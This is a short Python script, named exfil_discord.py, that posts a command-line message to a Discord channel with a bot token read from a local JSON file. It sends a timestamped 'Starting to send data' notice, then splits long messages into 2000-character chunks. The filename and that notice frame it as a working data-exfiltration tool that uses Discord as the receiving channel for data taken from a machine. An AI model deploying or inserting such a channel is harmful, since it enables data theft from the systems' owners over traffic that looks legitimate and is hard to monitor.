import datetime
import http.client
import json
import sys

if len(sys.argv) < 2:
    print("Usage: python3 exfil_discord.py <message>")
    sys.exit(1)

MESSAGE = str(sys.argv[1])

with open("discord-data.json", "r") as file:
    data = json.load(file)

BOT_TOKEN = data["BOT_TOKEN"]
CHANNEL_ID = data["CHANNEL_ID"]


def sendData(data):
    conn = http.client.HTTPSConnection("discord.com")
    payload = json.dumps({"content": data})

    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}

    conn.request(
        "POST",
        f"/api/v10/channels/{CHANNEL_ID}/messages",
        body=payload,
        headers=headers,
    )
    response = conn.getresponse()

    print(response.status, response.reason)
    print(response.read().decode())


sendData(f"Starting to send data: {datetime.datetime.now()}")

if len(MESSAGE) < 2000:
    sendData(MESSAGE)
else:
    for i in range(0, len(MESSAGE), 2000):
        sendData(MESSAGE[i : i + 2000])
